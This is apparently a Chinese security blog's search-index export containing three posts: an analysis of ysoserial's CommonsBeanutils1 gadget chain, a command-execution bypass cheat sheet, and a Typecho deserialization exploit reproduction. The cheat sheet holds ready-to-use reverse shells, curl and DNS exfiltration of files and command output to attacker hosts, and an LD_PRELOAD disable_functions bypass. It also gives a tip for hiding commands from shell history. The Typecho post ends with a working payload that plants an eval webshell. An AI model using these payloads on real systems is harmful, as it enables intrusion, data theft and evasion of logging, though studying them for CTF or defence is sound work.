<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ysoserial源码分析(1)]]></title>
    <url>%2F2018%2F04%2F27%2Fysoserial-analysis1.html</url>
    <content type="text"><![CDATA[一直觉得阅读好的代码对个人的编程能力帮助很大，最近一直在学习java安全，于是选择ysoserial这一个很有名气的工具进行分析，来丰富和扩展自己的见识，在完整地分析完其中的一个payload后，我也确实收获良多。 首先分析CommonsBeanutils1要用到的Gadgets类： Gadgets.java分析：createTemplatesImpl函数由于CommonsBeanutils1只用到了createTemplatesImpl函数，这里只分析这个函数。该函数主要用来将payload动态写入类，再将类写入字节数组并返回。 我们使用该函数时，是createTemplatesImpl(command)的形式，然后会调用reateTemplatesImpl ( final String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )方法，在该方法里，首先实例化了TemplatesImpl类，之所以使用该类，是因为该类有个字段_bytecodes，可以用来存储对象转化成的字节数组，我们知道如果再将_bytecodes生成java实例，便可方便我们向漏洞程序传payload，而实现将字节数组转化成java实例的功能在该类中也有相应的实现。 接下来就是利用了javassist的一系列类的特性，关于javassist，其实就是一个二方包，和反射功能相似，却比反射更强大，性能开销更低，详细了解可见：http://ju.outofmemory.cn/entry/79911。首先创建类池，然后把需要利用的类加载到搜索路径里，使用pool.get方法获取CtClassType类型的StubTransletPayload类，之后通过clazz.makeClassInitializer().insertAfter(cmd);往StubTransletPayload类的class里写入cmd。这里面的关键是makeClassInitializer函数，这个函数的作用返回一个CtConstructor类型的静态初始化器，如果不存在的话会新建一个，存在的话就返回。然后通过CtConstructor类的insertAfter方法写入cmd，接着使用serName方法产生一个随机值赋予CtClass的qualifiedName变量，在源码注解中有一段说明： * If the value of this field is not null, then all class * files modified by Javassist are saved under the directory * specified by this variable. For example, if the value is * &lt;code&gt;&quot;./debug&quot;&lt;/code&gt;, then all class files are saved * there. The directory name must not end with a directory * separator such as &lt;code&gt;/&lt;/code&gt;. * * &lt;p&gt;The default value is null. 每次产生不同的值可以使得每次修改产生的class文件放到特定的目录，从而允许重复exploit，然后修改StubTransletPayload父类为abstTranslet，最后使用toBytecode方法把类导入字节数组。接着利用反射机制将该字节数组及Gadgets.class生成的字节数组所组成的数组赋值给_bytecodes（这里解释一下，ClassFiles.classAsBytes(Foo.class)操作的作用是找到Foo.class的外部类，这里是Gadgets.class，并将其写入字节数组）。最后的最后，设置TemplatesImpl的两个属性值（这两个属性值在后续调用链中起到判断条件等作用，默认值为null，因此需要赋值），然后返回TemplatesImpl的对象。 CommonsBeanutils1分析：首先Gadgets.createTemplatesImpl(command)将command通过利用javassist包动态写入到字节数组中，并赋值给templates对象的_bytecodes属性，然后返回templates对象。 在TemplatesImpl中存在以下调用链：1234567TemplatesImpl.getOutputProperties() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.TransletClassLoader Class.newInstance() Runtime.exec() 通过跟踪源码，我们很容易发现上面的调用链，在getTransletInstance方法中部分代码如下： 12345678910111213141516171819private Translet getTransletInstance() throws TransformerConfigurationException &#123; try &#123; if (_name == null) return null; //这就是设置_name值的原因 if (_class == null) defineTransletClasses(); //通过ClassLoader加载字节码，存储在_class数组中 // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); //新建实例，触发恶意代码 translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) &#123; translet.setAuxiliaryClasses(_auxClasses); &#125; return translet; &#125; ...... 跟进defineTransletClasses会发现在里面使用了java.lang.ClassLoader.defineClass方法，这个方法我们知道可以从字节数组中读取出class类，而在这里defineTransletClasses方法也是通过defineClass方法来实现字节数组生成java类。接下来的AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); 则将从字节数组中还原的类实例化，从而触发了恶意代码。 现在条理已经很清晰，只要能够自动触发TemplatesImpl.getOutputProperties()方法执行，我们就能达到目的了。而这里，则正是利用了BeanComparator比较器来触发执行getOutputProperties()方法。 我们来具体看一看调用过程：1234567891011121314151617final BeanComparator comparator = new BeanComparator(&quot;lowestSetBit&quot;); // create queue with numbers and basic comparator final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator); // stub data for replacement later queue.add(new BigInteger(&quot;1&quot;)); queue.add(new BigInteger(&quot;1&quot;)); // switch method called by comparator Reflections.setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); // switch contents of queue final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, &quot;queue&quot;); queueArray[0] = templates; queueArray[1] = templates; return queue; 我们的反序列化链利用的是PriorityQueue类，而放入PriorityQueue的对象需要实现两个条件： 需要实现readObject方法要实现Comparable接口 之前储存payload方法使用的TemplatesImpl类满足第一个条件，却不满足第二个，怎么办呢，如果我们直接queue.add(templates)，所造成的后果就是生成payload时会抛出异常。经过跟踪代码，我发现还有一个原因导致不能直接add(templates)，因为add方法调用了offer方法，不断跟踪offer方法的调用发现最终会触发TemplatesImpl.getOutputProperties()，这样就导致我们生成payload的过程中就会执行命令从而导致payload生成失败，这是显然是我们不希望看到的。 所以代码这里首先实例化BeanComparator类，并将property设置为lowestSetBit(这是BigInteger的一个可比较属性，这里也可设置为BigInteger类的其他的可比较属性)，后面add(new BigInteger(“1”))，这些都是为了满足前面提到的条件。后面再用反射动态修改放入到PriorityQueue的对象从而绕过第二个条件的限制，我们看到代码利用反射机制将 Comparator的property 设置为 TemplatesImpl 的属性 outputProperties(在反序列化时会导致触发执行getOutputProperties()方法)，并获取了 PriorityQueue 的内置属性数组 queue，将 templates 按照索引值填入了 queue，然后返回PriorityQueue的实例化对象queue. 至此payload的构成算是完毕，接下来看看payload是如何工作的。 当我们的payload被漏洞程序反序列化时，即调用了PriorityQueue的readObject() 函数，整个反序列化调用链如下：1234567891011121314ObjectInputStream.readObject PriorityQueue.readObject PriorityQueue.heapify PriorityQueue.siftDown PriorityQueue.siftDownUsingComparator BeanComparator.compare PropertyUtils.getProperty( o1, property ) TemplatesImpl.getOutputProperties TemplatesImpl.newTransformer TemplatesImpl.getTransletInstance TemplatesImpl.defineTransletClasses TemplatesImpl.TransletClassLoader.defineClass Class.newInstance() Runtime.exec() 通过该调用链，顺利执行了命令。 这次分析先到这里，后面会抽空把其他payload分析一遍并发出来分享。]]></content>
  </entry>
  <entry>
    <title><![CDATA[各种命令执行总结]]></title>
    <url>%2F2018%2F03%2F23%2Fcommand-execute.html</url>
    <content type="text"><![CDATA[好久没更博客了，就把笔记里的东西整理一下发出来，里面还是有一些少见的trick的~本文持续更新~ 首先说一个小trick:在渗透过程中，我们常常需要清理痕迹，而在history中会记录命令执行历史，我们可以清除history。也有一个简单方法使得在终端执行的命令不被记录，实现方法很简单，在执行的命令前添加空格即可，该方法仅限在debain内核的系统中。 0X01 linux命令执行如何判断是否是linux命令执行可以使用的判断方法有&amp;+命令或|+命令，如： ping &amp;id 或 ping |idcurl &amp;id 或 curl |id 通过返回结果可判断是否是命令执行，同时这也是在前面有ping和curl的情况下进行命令执行的一种方法 读取文件当cat被过滤时，可尝试一下几种读取文件方法： strings flag.phpecho &gt; flag.phpuniq -c flag.phpbash -v flag.phprev flag.php 或者使用curl上传到vps，并在vps上开启监听进行读取： curl -T flag.php “http://192.168.x.xxx:6666“或curl “http://vps/“ –data-binary @/etc/passwd…在vps上：nc -lvpn 6666 空格绕过如果过滤了空格，常用的绕过方法有 $IFS{ls,-l}cat%09flag.phpcat &lt; flag.phpcat&lt;&gt;flag.php 其中后面两个适用于读取文件,而前两个则可完全代替空格，中间的%09需在php环境下，为了避免$IFS与后面的字符串写在一起被误解，需要分隔开$IFS，常用的方法有一下几种： ${IFS}$IFS$9$IFS\ 这里解释一下，$9是linux系统shell进程的第九个参数，始终为空字符串 /绕过 ${PATH:0:1} // ${str:a:b}表示提取字符串a开始的b个字符 ${PATH%%u*} 上面两个都能得到’/‘字符 利用同样的思路(即字符串截取)，我们可以得到更多~ 当然，一切都要建立在没有过滤$,{和}的基础上 加号绕过 $PS4 大于号绕过 $PS2 对某些命令的过滤当某些命令被正则匹配的方式过滤时，可以考虑的绕过方法如下： 字符串拼接： a=un;b=ame;$a$b若’;’被过滤，还可用%0a代替分号a=un%0ab=ame%0a$a$b 字符串截取： root@xxx:~# echo ${PATH:9:1}${PATH:11:1}lsroot@xxx:~# ${PATH:9:1}${PATH:11:1}Desktop 公共 模板 视频 图片 文档 下载 音乐 桌面 如果冒号被过滤，可以使用：root@xxx:~# $(expr substr $PATH 10 1)$(expr substr $PATH 12 1)Desktop 公共 模板 视频 图片 文档 下载 音乐 桌面 base64编码： root@xxx:~# echo “dW5hbWU=” | base64 -d |bashroot xxd（16进制）: root@xxx:~# printf “77686f616d69” | xxd -r -p | bashroot 利用反斜线来绕过: una\me 插入空字符串： u``nameu’’nameu””nameu${xxx}name 对文件名的过滤可用正则绕过，如flag被过滤的情况下读取flag.php，则可以使用：cat fla*来绕过 多条命令执行常见于curl/ping x.x.x.x,且x.x.x.x可控，此时可利用管道符，逻辑运算符，分号及%0a来绕过 ping x.x.x.x |lsping x.x.x.x ||lsping x.x.x.x&amp;lsping x.x.x.x&amp;&amp;lsping x.x.x.x;ls 在地址栏执行时可以利用回车的url编码%0a绕过：ping x.x.x.x%0als 对回显限制如果对回显中的特殊字符进行检测，则可以通过base64或16进制编码绕过，如 ls|base64 无回显可尝试构建一条带外信道提取数据，如： curl (你的ip)/?`whoami` 然后查看Apache日志curl `whoami`.3eea625fcaceaafc7db2.d.zhack.ca (该网站能直接返回接受的数据)S命令执行返回的结果不能包含空格和回车，可以通过base64编码或者如cat flag.php|sed &#39;s/[[:space:]]//g&#39;来清除空格,回车替换可以用sed &#39;:a;N;s/\n/*/;ba&#39;，这样就将回车换成了*S号 (因为sed默认是逐行处理数据，所以sed默认情况下不会处理到换行符，直接用sed s/\n/*/g不可行) 如果不想编码，还可以将数据附在HTTP头，如curl &quot;http://vpsip/&quot; -H &quot;User-Agent: $(id)&quot;或者post数据：id | curl &quot;http://vpsip/&quot; --data-binary @- 0X02 常用shell反弹网上有很多文章总结了，这里简单列举几个: bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f php -r ‘$sock=fsockopen(“10.0.0.1”,1234);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’ 0X03 Python命令执行下面是python中可用于命令执行的模块 ossubprocesscommandsplatformtimeitpicklepydoc 举例： 123#coding:utf-8import timeittimeit.timeit("__import__('os').system('')", number=1) 12import platformprint platform.popen('id', mode='r', bufsize=-1).read() 123import osos.system() print os.popen().read() 123import subprocesssubprocess.call(["cmd","arg1","arg2"],shell=True)subprocess.Popen('ls', shell=True) 12import commandsprint commands.getoutput('ls') 12import pydocpydoc.pipepager(None,'id') 12import picklepickle.loads("cos\nsystem\n(S'ifconfig'\ntR.") 当常见的os,subprocess,commands等被过滤时，除了可尝试用另外几个模块来实现命令执行外，也可灵活使用rot13编码绕过： 其中，有一点需要注意的是，subprocess中的shell如果shell=True的话，curl命令是被Bash(Sh)启动，所以支持shell语法。 如果shell=False的话，启动的是可执行程序本身，后面的参数不再支持shell语法(即执行的命令不能带有参数)。 pydoc更多玩法当系统中PAGER环境变量被设置时，pydoc模块将使用该值作为导入文档，这一点可以被用来执行任意命令，比如：12341.py：#!/usr/bin/pythonimport pydocpydoc.pager("") 此时在命令行: $ export PAGER=”whoami”$ python 1.py 此时命令行会显示结果: root python沙盒绕过简单的沙盒的绕过方法可以通过编码，如12#coding: rot_13&apos;vzcbeg bf&apos; //import os 有篇文章详细介绍了python沙盒绕过的各种方法：Python沙箱逃逸的n种姿势，这篇文章讲的很全面，这里就不再重述 0X04 PHP命令执行常用的php环境下命令执行操作汇总如下： 获取当前文件路径 echo dirname(__FILE__) ;echo getcwd(); 获取同目录下的所有文件名称 echo var_dump(glob(‘./*’));system(“ls”)/system(“dir”)/system–&gt;可换成执行系统命令的函数; 读取某个文件的内容 echo file_get_contents(“flag.php”);echo fgets(fopen(“flag.php”,”r”));show_source(“flag.php”);echo fread(fopen(“flag.php”,”r”),filesize(“flag.php”));echo var_dump(file(“flag.php”));copy(“flag.php”,”daiker.txt”);include ‘php://filter/read=convert.base64-encode/resource=flag.php’;highlight_file(“flag.php”); php配置文件里面有个disable_functions = …，可以用来禁止某些php函数，若常见能够执行系统命令的函数被禁用，又如何命令执行呢首先看看能够执行命令的函数： systemassertpassthruexecpcntl_execshell_execpopenproc_open 由于函数未禁用全，从而导致命令执行的案例也是很多的，所以当一些函数被禁止时，可尝试其他一些函数 当以上函数都被过滤时，可以使用下面几种方法： 拓展库绕过Linux下可通过编译拓展库进行绕过，在得知目标服务器的php版本后，本地下载相同版本的php源码包，并生成一个精心构造的拓展库，再使用dl函数调用拓展库即可实现命令执行，具体操作如下：123456789101112131415161718192021222324252627下载好php源码包后：tar zxvf php-5.3.10.tar.gzcd php-5.3.10/ext./ext_skel --extname=shell //生成名为shell的拓展库cd shellvi config.m4将以下三行前面的dnl去掉，然后保存退出：PHP_ARG_WITH(dl, for dl support,Make sure that the comment is aligned:[ --with-dl Include dl support])whereis phpize //找出phpize路径/usr/local/bin/phpize // 运行phpizevi shell.c在if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, &quot;s&quot;, &amp;arg, &amp;arg_len) == FAILURE) &#123; return;&#125;这一行下面添加：system(arg) 然后：whereis php-config //找出php-config的路径./configure --whith-php-config=php-config路径makemake install 将生成的拓展库文件/usr/local/lib/php/extensions/no-debug-non-zts-20180130/shell.so拷贝到extension_dir目录下，若extension_dir目录无写权限则先写入任意目录 , 在payload中用../../来实现调用payload如下：1234&lt;?phpdl("shell.so"); //shell.so在extension_dir目录，如不在则用../../来实现调用confirm_dl_compiled("$_GET[a]&gt;flag.txt");?&gt; cat flag.txt便可看到命令执行结果，当然，如果dl函数被禁用，该方法便无效了 LD_PRELOAD劫持当disable_functions 中没有禁止 putenv函数时，可以考虑上传个so文件进行LD_PRELOAD劫持，方法如下：在本地，vim shell.c 12345678910111213#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt; void payload() &#123; system("curl `whoami`.9b8534989b407ad73d33.d.zhack.ca");&#125; int geteuid() &#123;if (getenv("LD_PRELOAD") == NULL) &#123; return 0; &#125;unsetenv("LD_PRELOAD");payload();&#125; 当这个共享库中的geteuid被调用时，会加载payload()函数，从而实现执行命令。本地把它编译为一个位置信息无关的动态共享库： $ gcc -c -fPIC shell.c -o shell$ gcc -shared shell -o shell.so 写一个简单的利用文件1.php：1234&lt;?phpputenv("LD_PRELOAD=./shell.so");mail("root@localhost","","","","");?&gt; 将生成的shell.so及1.php上传到目标服务器，浏览器访问1.php，在dnsbin（可换成自己的vps）上可接收到whoami执行后的结果 该方法的前提是能够上传文件 xdebugXdebug 是一个 PHP 的调试工具，支持在本地通过源码远程调试服务器上的 PHP 代码，当xdebug.remote_connect_back选项为1时，可以进行远程调试，从而执行任意php函数,详情利用方式可见rr师傅博客：https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface perl命令执行perl中的open函数可以执行命令，在ctf的linux命令执行中可能会遇到用法如下： 创建一个类似格式为’命令|’的文件，再使用 GET &#39;file:命令|&#39;即可执行该命令，需要注意的是GET命令不是linux自带命令，而是存在于libwww-perl中，apt可安装 之所以使用GET命令可以命令执行，是因为GET函数底层调用了open函数]]></content>
  </entry>
  <entry>
    <title><![CDATA[typecho反序列化漏洞复现]]></title>
    <url>%2F2017%2F10%2F29%2Ftypecho-deserialization.html</url>
    <content type="text"><![CDATA[typecho反序列化漏洞复现0X00 前言Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。 0X01. 漏洞版本V1.1-15.5.12-beta以前 0X02 漏洞分析反序列化可控点：install.php 229~235行该博客程序判断是否安装的代码如下12345678910111213141516171819//判断是否已经安装if (!isset($_GET['finish']) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php') &amp;&amp; empty($_SESSION['typecho'])) &#123; exit;&#125;// 挡掉可能的跨站请求if (!empty($_GET) || !empty($_POST)) &#123; if (empty($_SERVER['HTTP_REFERER'])) &#123; exit; &#125; $parts = parse_url($_SERVER['HTTP_REFERER']); if (!empty($parts['port'])) &#123; $parts['host'] = "&#123;$parts['host']&#125;:&#123;$parts['port']&#125;"; &#125; if (empty($parts['host']) || $_SERVER['HTTP_HOST'] != $parts['host']) &#123; exit; &#125;&#125; 这里的判断逻辑有点滑稽，参数中含有finish并且Referer是内网即可进入install.php。。。既然能进入install.php,那么现在先决条件已具备，接着分析。 这里有一个反序列化操作，而参数从cookie获取，可控。 想到构造POP链。既然是序列化，免不了利用对象，于是跟进Typecho_Db对象看到这里对传入的参数\$adapterName进行了字符串拼接操作，如果$adapterName是一个实例化对象，就会触发__tostring魔法方法，全局搜索发现__tostring方法出现在以下三个类中： Typecho_FeedTypecho_ConfigTypecho_Db_Query 分别跟进后发现只有Typecho_Feed类可利用，可利用地点如下：在290行，如果screenName是不可访问变量，便会调用__get()魔法方法，搜索__get()方法，有好几处，分析后发现在Typecho_Request类中可以利用。在该类中__get方法调用了get方法，而在get方法中又调用了_applyFilter方法 跟进该方法醒目的array_map函数和call_user_func函数。。。至此POP链已经构造完成。 0X03 Payload1234567891011121314151617181920&lt;?phpclass Typecho_Feed&#123; private $_type = 'RSS 2.0'; private $_items; public function __construct($a) &#123; $this-&gt;_items[] = array('author'=&gt;$a); &#125;&#125;class Typecho_Request&#123; private $_params = array('screenName'=&gt;'file_put_contents('shell.php', '&lt;?php @eval($_POST[tharavel]);?&gt;')'); private $_filter = array('assert');&#125;$payload1 = new Typecho_Request();$payload2 = new Typecho_Feed($payload1);$exp = array('adapter' =&gt; $payload2, 'prefix' =&gt; 'typecho');echo base64_encode(serialize($exp));]]></content>
  </entry>
</search>